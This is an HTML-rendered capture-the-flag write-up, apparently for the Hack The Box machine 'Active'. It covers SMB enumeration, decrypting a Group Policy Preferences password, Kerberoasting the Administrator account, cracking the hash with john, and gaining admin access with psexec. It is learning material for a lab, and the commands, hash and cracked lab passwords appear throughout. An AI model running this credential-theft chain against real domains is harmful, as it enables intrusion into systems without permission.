I"…T<h2 id="enumeration">Enumeration</h2>
<h3 id="nmap-scanning">Nmap Scanning</h3>
<p><strong>Command</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>â””â”€$ nmap -sC -sV 10.10.10.100 -oN nmap-scan
</pre></td></tr></tbody></table></code></pre></div></div>
<p><strong>Result</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre></td><td class="rouge-code"><pre># Nmap 7.93 scan initiated Mon Dec 19 18:37:32 2022 as: nmap -sC -sV -oN nmap-scan 10.10.10.100
Nmap scan report for 10.10.10.100
Host is up (0.32s latency).
Scanned at 2022-12-19 18:37:33 EAT for 736s
Not shown: 982 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-12-19 15:46:41Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  unknown
49165/tcp open  unknown
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
|_smb2-time: Protocol negotiation failed (SMB2)
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 62820/tcp): CLEAN (Timeout)
|   Check 2 (port 40109/tcp): CLEAN (Timeout)
|   Check 3 (port 41928/udp): CLEAN (Timeout)
|   Check 4 (port 38631/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Dec 19 18:49:49 2022 -- 1 IP address (1 host up) scanned in 737.12 seconds
</pre></td></tr></tbody></table></code></pre></div></div>
<p>The above result shows different ports open and we can check them, lets start with <code class="language-plaintext highlighter-rouge">smb</code></p>
<h3 id="enumerate-smb">Enumerate smb</h3>
<p>We can run <code class="language-plaintext highlighter-rouge">smbmap</code> to check the files and permissions in the service</p>

<p><strong>Command</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€(gemstoneã‰¿hashghost)-[~/â€¦/htb/Machines/vip/active]
â””â”€$ smbmap -H 10.10.10.100
[+] IP: 10.10.10.100:445        Name: active.htb                                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS
</pre></td></tr></tbody></table></code></pre></div></div>
<p>After testing to access the smb the only promising content was <code class="language-plaintext highlighter-rouge">Replication</code> directory.</p>

<p>Another thing is <code class="language-plaintext highlighter-rouge">smbmap</code> has an ability to list things in recursive mode and by this we can check all the <code class="language-plaintext highlighter-rouge">Replication</code> directory to see if there anything interesting.</p>

<p><strong>Command</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€(gemstoneã‰¿hashghost)-[~/â€¦/htb/Machines/vip/active]
â””â”€$ smbmap -H 10.10.10.100 -R Replication
</pre></td></tr></tbody></table></code></pre></div></div>
<p>For this box the above command failed so i decided to use <code class="language-plaintext highlighter-rouge">smbclient</code> and navigate to <code class="language-plaintext highlighter-rouge">Replication</code> manually this yielded to the following:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\&gt; dir
  .                                   D        0  Sat Jul 21 13:37:44 2018
  ..                                  D        0  Sat Jul 21 13:37:44 2018
  Groups.xml                          A      533  Wed Jul 18 23:46:06 2018

                5217023 blocks of size 4096. 244870 blocks available
</pre></td></tr></tbody></table></code></pre></div></div>
<p>I downloaded <code class="language-plaintext highlighter-rouge">Gropus.xml</code> file which is  <code class="language-plaintext highlighter-rouge">Group Policy</code> file with local account users information, it was very common in <code class="language-plaintext highlighter-rouge">2008</code> Windows Server. I downloaded the file into my Linux machine by using <code class="language-plaintext highlighter-rouge">get</code> command and it contains the followings contents:</p>
<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
<span class="nt">&lt;Groups</span> <span class="na">clsid=</span><span class="s">"{3125E937-EB16-4b4c-9934-544FC6D24D26}"</span><span class="nt">&gt;</span>
	<span class="nt">&lt;User</span> <span class="na">clsid=</span><span class="s">"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"</span> <span class="na">name=</span><span class="s">"active.htb\SVC_TGS"</span> <span class="na">image=</span><span class="s">"2"</span> <span class="na">changed=</span><span class="s">"2018-07-18 
    20:46:06"</span> <span class="na">uid=</span><span class="s">"{EF57DA28-5F69-4530-A59E-AAB58578219D}"</span><span class="nt">&gt;</span>
       <span class="nt">&lt;Properties</span> <span class="na">action=</span><span class="s">"U"</span> <span class="na">newName=</span><span class="s">""</span> <span class="na">fullName=</span><span class="s">""</span> <span class="na">description=</span><span class="s">""</span> 
        <span class="na">cpassword=</span><span class="s">"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"</span> 
        <span class="na">changeLogon=</span><span class="s">"0"</span> <span class="na">noChange=</span><span class="s">"1"</span> <span class="na">neverExpires=</span><span class="s">"1"</span> <span class="na">acctDisabled=</span><span class="s">"0"</span> <span class="na">userName=</span><span class="s">"active.htb\SVC_TGS"</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;/User&gt;</span>
<span class="nt">&lt;/Groups&gt;</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>The important details are <code class="language-plaintext highlighter-rouge">username : active.htb\SVC_TGS</code> and <code class="language-plaintext highlighter-rouge">cpassowrd : edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqhgit+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</code></p>

<p>Then since we have <code class="language-plaintext highlighter-rouge">username</code> then we can try to crack his <code class="language-plaintext highlighter-rouge">password</code></p>
<h3 id="cracking-the-password">Cracking the Password</h3>
<p>To crack this kind of password the tool known as <code class="language-plaintext highlighter-rouge">gpp-decrypt</code> can be used</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€(gemstoneã‰¿hashghost)-[~/â€¦/htb/Machines/vip/active]
â””â”€$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
</pre></td></tr></tbody></table></code></pre></div></div>
<h3 id="hunting-for-other-users-in-active-directory">Hunting for other users in Active Directory</h3>
<p><strong>Command</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€(gemstoneã‰¿hashghost)-[~/â€¦/htb/Machines/vip/active]
â””â”€$ impacket-GetADUsers -all active.htb/svc_tgs -dc-ip 10.10.10.100
</pre></td></tr></tbody></table></code></pre></div></div>
<p><strong>Result</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Querying 10.10.10.100 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2018-07-18 22:06:40.351723  2022-12-20 09:43:59.406154 
Guest                                                 &lt;never&gt;              &lt;never&gt;             
krbtgt                                                2018-07-18 21:50:36.972031  &lt;never&gt;             
SVC_TGS                                               2018-07-18 23:14:38.402764  2018-07-21 17:01:30.320277 
</pre></td></tr></tbody></table></code></pre></div></div>
<p>I tried to login by using <code class="language-plaintext highlighter-rouge">impacket-psexec</code> but it failed due to reason that user <code class="language-plaintext highlighter-rouge">svc_tgs</code> is not <code class="language-plaintext highlighter-rouge">administrator</code> but since we have credentials we can use <code class="language-plaintext highlighter-rouge">smbmap</code> to check what this user can do</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€(gemstoneã‰¿hashghost)-[~/â€¦/htb/Machines/vip/active]
â””â”€$ smbmap -H 10.10.10.100 -d active.htb -u svc_tgs -p GPPstillStandingStrong2k18
[+] IP: 10.10.10.100:445        Name: active.htb                                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
</pre></td></tr></tbody></table></code></pre></div></div>
<p>User <code class="language-plaintext highlighter-rouge">svc_tgs</code> can read into users directory, so we can navigate to it by using <code class="language-plaintext highlighter-rouge">smbclient</code> to take a user flag.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€(gemstoneã‰¿hashghost)-[~/â€¦/htb/Machines/vip/active]
â””â”€$ smbclient //10.10.10.100/Users -U svc_tgs                                                                                                                                               
Password for [WORKGROUP\svc_tgs]:        
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Download user flag</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>smb: \svc_tgs\desktop\&gt; get user.txt
getting file \svc_tgs\desktop\user.txt of size 34 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
</pre></td></tr></tbody></table></code></pre></div></div>
<p><strong>User flag</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€(gemstoneã‰¿hashghost)-[~/â€¦/htb/Machines/vip/active]
â””â”€$ cat user.txt 
d0d2d6a0c7******
</pre></td></tr></tbody></table></code></pre></div></div>
<h2 id="administrator-account">Administrator Account</h2>
<h3 id="kerberosting">Kerberosting</h3>
<p>Lets try <code class="language-plaintext highlighter-rouge">impacket-GetUserSPNs</code>  to see if <code class="language-plaintext highlighter-rouge">active\Administrator</code> account has been configured with a <code class="language-plaintext highlighter-rouge">SPN</code>.</p>

<p><strong>Command</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€(gemstoneã‰¿hashghost)-[~/â€¦/htb/Machines/vip/active]
â””â”€$ impacket-GetUserSPNs active.htb/svc_tgs -dc-ip 10.10.10.100 -request 
</pre></td></tr></tbody></table></code></pre></div></div>
<p><strong>Result</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation                                                                                                                                    

Password:                                                                                                                                                                                   
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation                           
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------                           
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 22:06:40.351723  2022-12-20 09:43:59.406154                                       

[-] CCache file is not found. Skipping...                                                                                                                                                   
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$0bd99a2a651a9a75117130fff4ae9e14$331ea106f7428a9f4fbdc7a11e3704e2fc2beab0061dc6d4ec24494003918b22caa904285de963ad64fbf045501d137a6c22d04946e8c9b9240c9bdfa29ae1401f89ef0992aefafe1c4dca808e531c9f3ab76533b0f4a6c7a1f74f4861228e9aab0023ca0403db6de23fd1a03fb91755f2848d487c31aa8f4e66f0d066b71a0d2f178d79d1eac20c0c19392cccf1a35198334b668c5c6d1492ee415e2a409da193e9ff251b6828dab6b21ce32b92b30708912d4bb9ff7f9165c8b0ebe767c8fbb6c4b110576f7a99bdb9e76f0e2b96872e5abf3d2891dd3be28ff8e339db1f1b158cf3188b80db60270d683d247eca2188432f31b1953eda154e12316882cf759116ac65eb48fa252f2f025cd7efaa7b4877a9e2ad86a871663438f9168af73372dfaea26a2d73085bebd159de9c283ead678180e9c3a8f4e71ca79cf904bb5f973086591b0e0d9b7873aeb4e88c11247aabf8a6fafd20ce05332611644dab78601dc7ff1a832250b6738e91bbab5c925d0346e5041d742c1ea52df18a3124ae044cafc4cf1faf500a13e48e5dcf5e9310af8a6b5f1d70666cbc56c691d57ed7c853ec9a1cc6b3609495c0954e23498c3b16b35a0de62b4644328d1b54a97a87c2375c9491716b8bc2995925bc3583dc3511d4430d9113794d158775d64633ba6a147c84c36247442cb1ae4ab5995fb45ba416dfed95d2ddc6a98f3c93de6a2daa7ae66f40f2fb2c94dbdcb861300d95b851524100ba7a629ff8170413a5fafb9d0e92c101a3f0060129cd90e8e8d6d28141f1f9b9703f619c09067e2445f8f10a728cec621af2d0a262be031f52c784a322fc4763cc5df164c362bc1aa25567cfe2cb335d8a9cf349df03096b9e4a3f563d02ecb74ce90ee7e20cfae13fc0b7972ea4433514435459a0bd48fb1dd159de9a910b8dcd4d632aad3e7c9c91bd39966b13a26351fd20b2f88305365d0e71f0a50db003c33408efd945d2d0d2c8f4859587ddc7e1df7635a8fc5f0ef1879fc65c2a8811af80454f6a667c9987344f0e380d0a5d901bb14b943745afbfb9ecc6ccb2a6ca3d31dbd02dd53802e8398102dafe8df80ef6208f83a10293dc0e5fdf8f928d624eb0812ec6aab0f22de1435a7940f7bb29b3de04414560a9096202936a812feaf314823a1f3dc73f78a18b4bf396a822c95a9b0bacc5783e487591a83aebee0a89f97feedde68e881cec2ca81c00270a75dd3d1159214ac27b45aa120f26dba09f05f8251e
</pre></td></tr></tbody></table></code></pre></div></div>
<p><strong>crack the hash</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€(gemstoneã‰¿hashghost)-[~/â€¦/htb/Machines/vip/active]
â””â”€$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
</pre></td></tr></tbody></table></code></pre></div></div>
<p><strong>Result</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€(gemstoneã‰¿hashghost)-[~/â€¦/htb/Machines/vip/active]
â””â”€$ john hash --show                                                                                                                                                                    1 â¨¯
?:Ticketmaster1968

1 password hash cracked, 0 left
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Now login to the machine as user <code class="language-plaintext highlighter-rouge">Administrator</code> by using <code class="language-plaintext highlighter-rouge">impacket-psexec</code></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€(gemstoneã‰¿hashghost)-[~/â€¦/htb/Machines/vip/active]
â””â”€$ impacket-psexec    active.htb/administrator:Ticketmaster1968@10.10.10.100 
</pre></td></tr></tbody></table></code></pre></div></div>
<p><strong>Root flag</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>C:\Users\Administrator\Desktop&gt; type root.txt
12a3d6a9eb**********
</pre></td></tr></tbody></table></code></pre></div></div>
<p>The end.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>Mungu Nisaidie
</pre></td></tr></tbody></table></code></pre></div></div>
:ET